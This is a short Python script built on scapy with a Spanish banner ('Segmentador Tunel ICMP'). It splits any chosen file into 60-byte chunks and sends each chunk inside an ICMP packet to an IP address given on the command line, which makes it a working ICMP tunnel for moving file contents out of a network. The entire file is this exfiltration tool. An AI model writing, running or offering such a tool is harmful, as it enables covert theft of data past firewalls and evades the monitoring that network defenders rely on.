#!/usr/bin/env python3
from scapy.all import *
import os
import sys
from termcolor import colored
print(colored("""\
        _           _ _             
  /\  /(_)_ __ ___ (_) |_ ___ _   _ 
 / /_/ / | '_ ` _ \| | __/ __| | | |
/ __  /| | | | | | | | |_\__ \ |_| |
\/ /_/ |_|_| |_| |_|_|\__|___/\__,_|
                    """, "red"))

print(colored("-Segmentador Tunel ICMP - By: NaotaClone-", "red"))

def divide_archivo(nombre_archivo, tamano_parte):
    partes = []
    with open(nombre_archivo, "rb") as archivo:
        while True:
            parte = archivo.read(tamano_parte)
            if not parte:
                break
            partes.append(parte)
    return partes

def enviar_paquetes(destino, partes):
    print(f"Enviando {len(partes)} paquetes a {destino}")
    for i, parte in enumerate(partes):
        print(f"Enviando parte {i+1} de {len(partes)}")
        paquete = IP(dst=destino)/ICMP()/parte
        send(paquete)
    print("Transmisión de paquetes finalizada.")

def main():
    if len(sys.argv) < 3:
        print(f"Uso: {sys.argv[0]} <Nombre de Archivo> <Direccion IP de Destino>")
        sys.exit(1)

    nombre_archivo = sys.argv[1]
    destino = sys.argv[2]

    if not os.path.isfile(nombre_archivo):
        print(f"Error: el archivo {nombre_archivo} no existe.")
        sys.exit(1)

    partes = divide_archivo(nombre_archivo, 60)

    enviar_paquetes(destino, partes)

if __name__ == "__main__":
    main()
